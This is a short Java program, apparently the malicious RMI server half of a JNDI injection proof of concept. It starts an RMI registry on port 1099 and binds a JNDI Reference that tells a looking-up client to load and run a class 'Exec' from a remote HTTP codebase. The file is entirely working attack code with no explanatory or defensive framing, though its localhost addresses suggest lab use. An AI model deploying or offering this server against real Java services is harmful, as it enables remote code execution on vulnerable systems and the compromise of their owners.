import com.sun.jndi.rmi.registry.ReferenceWrapper;
import javax.naming.Reference;
import java.rmi.registry.Registry;
import java.rmi.registry.LocateRegistry;

public class Server {

    public static void main(String args[]) throws Exception {

        Registry registry = LocateRegistry.createRegistry(1099);
        Reference aa = new Reference("Exec", "Exec", "http://127.0.0.1:8081/");
        ReferenceWrapper refObjWrapper = new ReferenceWrapper(aa);
        System.out.println("Binding 'refObjWrapper' to 'rmi://127.0.0.1:1099/aa'");
        registry.bind("aa", refObjWrapper);

    }

}